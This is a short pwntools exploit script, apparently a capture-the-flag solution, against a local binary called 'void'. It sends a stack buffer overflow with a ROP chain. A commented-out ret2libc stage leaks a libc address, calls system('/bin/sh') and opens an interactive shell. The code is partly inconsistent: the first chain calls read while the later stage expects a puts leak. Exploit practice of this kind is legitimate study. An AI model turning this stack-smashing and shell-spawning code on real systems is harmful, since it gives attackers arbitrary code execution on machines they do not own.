from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

offset = 72

elf = ELF('./void')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
#libc = ELF('./glibc/libc.so.6') 

padding = offset*'A'

#ip, port=
#io = remote(ip,port)
io = process('./void')

pop_rdi_ret = 0x4011bb
pop_rsi_r15_ret = 0x4011b9

rop_chain = p64(pop_rdi_ret)
rop_chain += p64(0)
rop_chain += p64(pop_rsi_r15_ret)
rop_chain += p64(elf.got['read'])
rop_chain += p64(elf.got['read'])
rop_chain += p64(0x401030)
rop_chain += p64(elf.symbols['vuln'])

payload = padding+rop_chain
io.sendline(payload)
print io.recvline()
print io.recvline()
print io.recvline()
'''
puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))

#print hex(puts_addr)

log.info("Leaked server's libc address, puts(): "+hex(puts_addr))

server_libc_base = puts_addr - libc.symbols['puts']
log.info("Leaked server's libc base address: "+hex(server_libc_base))

libc.address = server_libc_base
rop_libc = ROP(libc)
rop_libc.call((rop_libc.find_gadget(['ret']))[0])  #!!Padding/16 bytes!
rop_libc.call(libc.symbols['system'], [next(libc.search(b'/bin/sh\x00'))])
payload2 = padding + rop_libc.chain()

io.sendlineafter('>> ','2')
io.sendlineafter('Insert location of the library: ',payload2)
io.interactive()
'''
